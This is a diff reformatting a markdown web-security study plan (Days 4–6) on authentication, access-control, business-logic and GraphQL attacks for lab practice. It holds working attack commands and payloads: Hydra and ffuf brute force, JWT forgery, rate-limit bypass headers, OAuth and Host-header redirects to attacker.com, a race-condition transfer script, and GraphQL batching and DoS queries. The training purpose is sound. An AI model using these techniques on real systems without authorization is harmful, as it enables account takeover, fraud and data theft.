@@ -407,374 +407,334 @@ Practical Lab
     Complete 30+ PortSwigger labs
 
 ---
+## Day 4: Authentication \& Authorization Attacks
 
-##  Day 4: Authentication \& Authorization Attacks
+**Study Time:** 4-5 hours
 
-Study Time: 4-5 hours
-Morning: Authentication Flaws (2 hours)
-Username Enumeration
+### Morning: Authentication Flaws (2 hours)
 
-text
+#### Username Enumeration
 
-# Timing-based enumeration
+**Timing-based enumeration**
 
-ffuf -w usernames.txt -u [https://target.com/login](https://target.com/login) \
--X POST -d "username=FUZZ\&password=invalid" \
--H "Content-Type: application/x-www-form-urlencoded" \
--mr "Invalid credentials"
+```bash
+ffuf -w usernames.txt -u https://target.com/login \
+  -X POST -d "username=FUZZ&password=invalid" \
+  -H "Content-Type: application/x-www-form-urlencoded" \
+  -mr "Invalid credentials"
+```
 
-# Response difference
+**Response difference**
 
+```text
 # Valid user: "Incorrect password"
-
 # Invalid user: "User not found"
+```
 
-Password Brute-Force
 
-text
+#### Password Brute-Force
 
+```bash
 # Hydra
-
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
-target.com http-post-form "/login:username=^USER^\&password=^PASS^:Invalid"
+  target.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
 
 # Burp Intruder with Pitchfork attack (user:pass pairs)
+```
 
-Rate Limiting Bypass
 
-text
+#### Rate Limiting Bypass
 
+```http
 # IP rotation via headers
-
 X-Forwarded-For: 1.2.3.4
 X-Originating-IP: 1.2.3.4
 X-Remote-IP: 1.2.3.4
 X-Client-IP: 1.2.3.4
+```
 
+```text
 # Null byte bypass
-
-username=admin%00\&password=test
+username=admin%00&password=test
 
 # Race condition
-
 # Send multiple requests simultaneously
+```
 
-Afternoon: Advanced Authentication Attacks (3 hours)
-JWT Attacks
 
-text
+### Afternoon: Advanced Authentication Attacks (3 hours)
 
+#### JWT Attacks
+
+```bash
 # Install jwt_tool
-
-git clone [https://github.com/ticarpi/jwt_tool](https://github.com/ticarpi/jwt_tool)
+git clone https://github.com/ticarpi/jwt_tool
 cd jwt_tool
 
 # Test for vulnerabilities
-
 python3 jwt_tool.py <JWT_TOKEN>
 
 # Algorithm confusion (RS256 to HS256)
-
 python3 jwt_tool.py <JWT> -X k -pk public.pem
 
 # None algorithm
-
 python3 jwt_tool.py <JWT> -X n
 
 # Weak secret brute-force
-
 python3 jwt_tool.py <JWT> -C -d /path/to/secrets.txt
 
 # Kid injection
-
 python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S
+```
 
-OAuth/SAML Attacks
 
-text
+#### OAuth/SAML Attacks
 
+```text
 # Open redirect via redirect_uri
-
-[https://provider.com/oauth/authorize?redirect_uri=https://attacker.com](https://provider.com/oauth/authorize?redirect_uri=https://attacker.com)
+https://provider.com/oauth/authorize?redirect_uri=https://attacker.com
 
 # Token leakage
-
 # Check if access token exposed in Referer header
 
 # Pre-account takeover
-
 # Register with victim email before they verify
+```
 
-2FA/MFA Bypass
 
-text
+#### 2FA/MFA Bypass
 
+```text
 # Direct request bypass
-
 # Login -> 2FA page -> Try directly accessing /dashboard
 
 # Response manipulation
-
 POST /verify-otp
 {"code": "123456", "verified": false}
-
 # Change verified to true in intercepted response
 
 # Rate limiting on OTP
-
 # Brute-force 6-digit codes (000000-999999)
 
 # Backup codes reuse
-
 # Test if backup codes can be reused multiple times
 
 # Remember device bypass
-
 # Steal "remember_device" token
 
 # Session fixation
-
 # Use same session before and after 2FA
+```
 
-Password Reset Vulnerabilities
 
-text
+#### Password Reset Vulnerabilities
 
+```text
 # Token predictability
-
 # Collect multiple reset tokens, analyze for patterns
 
 # Token not expiring
-
 # Use old tokens after password change
 
 # Host header injection
-
 POST /reset-password
 Host: attacker.com
-
 # Reset link points to attacker.com
 
 # Parameter pollution
+email=victim@target.com&email=attacker@evil.com
+```
 
-email=victim@target.com\&email=attacker@evil.com
 
-Practical Lab
+### Practical Lab
 
-    PortSwigger Authentication: All 15 labs (including 2FA bypass, JWT attacks)
-    
-    PortSwigger OAuth: All 7 labs
-    
-    Juice Shop: "Login Bender", "Reset Bjoern's Password", "Login Jim", "JWT Issues"
-    
-    HTB: "Manager" box (password spraying + privilege escalation)
-    Today's Checklist
+- PortSwigger Authentication: All 15 labs (including 2FA bypass, JWT attacks)[^1]
+- PortSwigger OAuth: All 7 labs[^1]
+- Juice Shop: "Login Bender", "Reset Bjoern's Password", "Login Jim", "JWT Issues"
+- HTB: "Manager" box (password spraying + privilege escalation)
 
-    Master username enumeration techniques
-    
-    Practice JWT exploitation
-    
-    Learn 2FA/MFA bypass methods
-    
-    Understand OAuth vulnerabilities
-    
-    Complete 22 PortSwigger labs
 
----
+### Today's Checklist
+
+- [ ] Master username enumeration techniques
+- [ ] Practice JWT exploitation
+- [ ] Learn 2FA/MFA bypass methods
+- [ ] Understand OAuth vulnerabilities
+- [ ] Complete 22 PortSwigger labs
+
+***
 
 ## Day 5: IDOR, Access Control \& Business Logic
 
-Study Time: 4-5 hours
-Morning: IDOR Fundamentals (2 hours)
-Identification
+**Study Time:** 4-5 hours
 
-text
+### Morning: IDOR Fundamentals (2 hours)
 
+#### Identification
+
+```text
 # Numeric IDs
-
 /api/user/123
-/api/user/124  (try other user IDs)
+/api/user/124  # try other user IDs
 
 # UUIDs
-
 /api/documents/550e8400-e29b-41d4-a716-446655440000
-
 # Try to predict or enumerate UUIDs
 
 # Encoded IDs
-
-/api/order/dXNlcjEyMw==  (base64: user123)
-
+/api/order/dXNlcjEyMw==  # base64: user123
 # Decode, modify, re-encode
 
 # Hashed IDs
-
-/api/profile/5f4dcc3b5aa765d61d8327deb882cf99  (MD5: password)
-
+/api/profile/5f4dcc3b5aa765d61d8327deb882cf99  # MD5: password
 # Attempt hash reversal or dictionary attack
+```
 
-Testing Methodology
 
-    Create two accounts (user A, user B)
-    
-    Identify all ID parameters
-    
-    As user A, access user B's resources
-    
-    Test: GET, POST, PUT, DELETE, PATCH methods
-    
-    Check for vertical privilege escalation (user → admin)
-    Afternoon: Advanced Access Control \& Business Logic (3 hours)
-Horizontal Privilege Escalation
+#### Testing Methodology
 
-text
+- Create two accounts (user A, user B)
+- Identify all ID parameters
+- As user A, access user B's resources
+- Test: GET, POST, PUT, DELETE, PATCH methods
+- Check for vertical privilege escalation (user → admin)
 
+
+### Afternoon: Advanced Access Control \& Business Logic (3 hours)
+
+#### Horizontal Privilege Escalation
+
+```text
 # Parameter pollution
-
-/api/profile?uid=123\&uid=456
+/api/profile?uid=123&uid=456
 
 # Array manipulation
-
-{"userids": (see the generated image above)}  \# Access multiple users
+{"userids": [123, 456]}  # Access multiple users
 
 # Wildcard abuse
-
 /api/users/*
 /api/users/all
+```
 
-Vertical Privilege Escalation
 
-text
+#### Vertical Privilege Escalation
 
+```text
 # Method override
-
 POST /api/user/123
 X-HTTP-Method-Override: DELETE
 
 # Role manipulation
-
 {"username": "victim", "role": "admin"}
 
 # Path traversal in API
-
 /api/v1/users/../../admin/panel
+```
 
-Business Logic Flaws
 
-Race Conditions:
+#### Business Logic Flaws
 
-text
+**Race Conditions:**
 
+```python
 # Example: Transfer money race condition
-
 import requests
 import threading
 
 def transfer():
-requests.post('https://target.com/transfer',
-data={'to': 'attacker', 'amount': 1000},
-cookies={'session': 'user_session'})
+    requests.post('https://target.com/transfer',
+                  data={'to': 'attacker', 'amount': 1000},
+                  cookies={'session': 'user_session'})
 
 # Fire 10 simultaneous requests
-
 threads = [threading.Thread(target=transfer) for _ in range(10)]
 for t in threads: t.start()
 for t in threads: t.join()
+```
 
-Price Manipulation:
+**Price Manipulation:**
 
-text
+```json
 // Intercept checkout request
 {"items": [
-{"id": 123, "price": 100, "quantity": 1}
+  {"id": 123, "price": 100, "quantity": 1}
 ]}
 
 // Change to negative or zero
 {"items": [
-{"id": 123, "price": -100, "quantity": 1}
+  {"id": 123, "price": -100, "quantity": 1}
 ]}
+```
 
-Workflow Bypass:
+**Workflow Bypass:**
 
-text
-
+```text
 # Skip verification steps
-
 1. Registration -> 2. Email Verify -> 3. Activate
 
 # Try: 1. Registration -> 3. Activate (skip step 2)
+```
 
-Practical Lab
 
-    PortSwigger Access Control: All 13 labs
-    
-    PortSwigger Business Logic: All 11 labs
-    
-    Juice Shop: "View Basket", "Forged Coupon", "Manipulate Basket", "Admin Registration"
-    
-    HTB Academy: "Business Logic Vulnerabilities" module
-    Today's Checklist
+### Practical Lab
 
-    Master IDOR identification
-    
-    Practice horizontal privilege escalation
-    
-    Learn race condition exploitation
-    
-    Understand business logic flaws
-    
-    Complete 24 PortSwigger labs
+- PortSwigger Access Control: All 13 labs[^1]
+- PortSwigger Business Logic: All 11 labs[^1]
+- Juice Shop: "View Basket", "Forged Coupon", "Manipulate Basket", "Admin Registration"
+- HTB Academy: "Business Logic Vulnerabilities" module
 
----
+
+### Today's Checklist
+
+- [ ] Master IDOR identification
+- [ ] Practice horizontal privilege escalation
+- [ ] Learn race condition exploitation
+- [ ] Understand business logic flaws
+- [ ] Complete 24 PortSwigger labs
+
+***
 
 ## Day 6: API Security \& GraphQL
 
-Study Time: 4-5 hours
-Morning: REST API Fundamentals (2 hours)
-OWASP API Security Top 10
+**Study Time:** 4-5 hours
 
-    Broken Object Level Authorization (BOLA/IDOR)
-    
-    Broken Authentication
-    
-    Broken Object Property Level Authorization
-    
-    Unrestricted Resource Consumption
-    
-    Broken Function Level Authorization
-    
-    Unrestricted Access to Sensitive Business Flows
-    
-    Server Side Request Forgery (SSRF)
-    
-    Security Misconfiguration
-    
-    Improper Inventory Management
-    
-    Unsafe Consumption of APIs
-    API Enumeration
+### Morning: REST API Fundamentals (2 hours)
 
-text
+#### OWASP API Security Top 10[^2][^3]
 
+- Broken Object Level Authorization (BOLA/IDOR)
+- Broken Authentication
+- Broken Object Property Level Authorization
+- Unrestricted Resource Consumption
+- Broken Function Level Authorization
+- Unrestricted Access to Sensitive Business Flows
+- Server Side Request Forgery (SSRF)
+- Security Misconfiguration
+- Improper Inventory Management
+- Unsafe Consumption of APIs
+
+
+#### API Enumeration
+
+```bash
 # Find API endpoints
-
-gospider -s [https://target.com](https://target.com) -o output
+gospider -s https://target.com -o output
 cat output/* | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*api*" | sort -u
 
 # API documentation discovery
-
-ffuf -w /path/to/api-docs.txt -u [https://target.com/FUZZ](https://target.com/FUZZ)
-
+ffuf -w /path/to/api-docs.txt -u https://target.com/FUZZ
 # Common: /api/docs, /api/swagger.json, /api/openapi.json, /graphql
 
 # Extract endpoints from JS
+python3 LinkFinder.py -i https://target.com/app.js -o api-endpoints.html
+```
 
-python3 LinkFinder.py -i [https://target.com/app.js](https://target.com/app.js) -o api-endpoints.html
 
-Afternoon: Advanced API \& GraphQL Attacks (3 hours)
-Mass Assignment
+### Afternoon: Advanced API \& GraphQL Attacks (3 hours)
 
-text
+#### Mass Assignment
+
+```json
 // Normal registration
 POST /api/register
 {"username": "attacker", "email": "test@test.com"}
@@ -782,118 +742,116 @@ POST /api/register
 // Try adding privileged fields
 POST /api/register
 {"username": "attacker", "email": "test@test.com", "role": "admin", "verified": true}
+```
 
-API Versioning Abuse
 
-text
+#### API Versioning Abuse
 
+```text
 # Test old API versions with weaker security
-
-/api/v1/users  (old, vulnerable)
-/api/v2/users  (current)
-/api/v3/users  (beta)
+/api/v1/users  # old, vulnerable
+/api/v2/users  # current
+/api/v3/users  # beta
 
 # Check if old versions still work and lack newer security
+```
 
-GraphQL Introspection
 
-text
+#### GraphQL Introspection
 
+```graphql
 # Discover schema
-
 {
-__schema {
-types {
-name
-fields {
-name
-type {
-name
+  __schema {
+    types {
+      name
+      fields {
+        name
+        type {
+          name
+        }
+      }
+    }
+  }
 }
-}
-}
-}
-}
+```
 
-GraphQL Injection \& Exploitation
 
-text
+#### GraphQL Injection \& Exploitation
 
+```graphql
 # IDOR via GraphQL
-
 {
-user(id: "123") {
-email
-password
-creditCard
-}
+  user(id: "123") {
+    email
+    password
+    creditCard
+  }
 }
 
 # Change id to access other users
-
 {
-user(id: "124") {
-email
-password
-}
+  user(id: "124") {
+    email
+    password
+  }
 }
 
 # Batching attack (bypass rate limiting)
-
 query {
-user1: user(id: "1") { email }
-user2: user(id: "2") { email }
-user3: user(id: "3") { email }
-...
-user1000: user(id: "1000") { email }
+  user1: user(id: "1") { email }
+  user2: user(id: "2") { email }
+  user3: user(id: "3") { email }
+  ...
+  user1000: user(id: "1000") { email }
 }
 
 # Alias-based DoS
-
 query {
-a1: users { ... }
-a2: users { ... }
-
-# ... repeat 1000 times
-
+  a1: users { ... }
+  a2: users { ... }
+  # ... repeat 1000 times
 }
+```
 
-GraphQL Tools
 
-text
+#### GraphQL Tools
 
+```bash
 # InQL Scanner (Burp extension)
 
 # Graphw00f (fingerprint GraphQL)
-
-python3 main.py -d -f -t [https://target.com/graphql](https://target.com/graphql)
+python3 main.py -d -f -t https://target.com/graphql
 
 # GraphQL Cop (security audit)
+python3 graphql-cop.py -t https://target.com/graphql
+```
 
-python3 graphql-cop.py -t [https://target.com/graphql](https://target.com/graphql)
 
-Practical Lab
+### Practical Lab
 
-    VAmPI: All challenges
-    
-    DVWA: API-related modules
-    
-    PortSwigger API Testing: All labs
-    
-    HTB: "OpenSource" box (API exploitation)
-    
-    Damn Vulnerable GraphQL Application
-    Today's Checklist
+- VAmPI: All challenges
+- DVWA: API-related modules
+- PortSwigger API Testing: All labs[^1]
+- HTB: "OpenSource" box (API exploitation)
+- Damn Vulnerable GraphQL Application
 
-    Learn OWASP API Top 10
-    
-    Master GraphQL introspection
-    
-    Practice API enumeration
-    
-    Exploit mass assignment
-    
-    Complete VAmPI challenges
+
+### Today's Checklist
+
+- [ ] Learn OWASP API Top 10[^3][^2]
+- [ ] Master GraphQL introspection
+- [ ] Practice API enumeration
+- [ ] Exploit mass assignment
+- [ ] Complete VAmPI challenges
+
+
+[^1]: https://portswigger.net/web-security/all-labs
+
+[^2]: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
+
+[^3]: https://owasp.org/www-project-api-security/
+
 
 ---
 
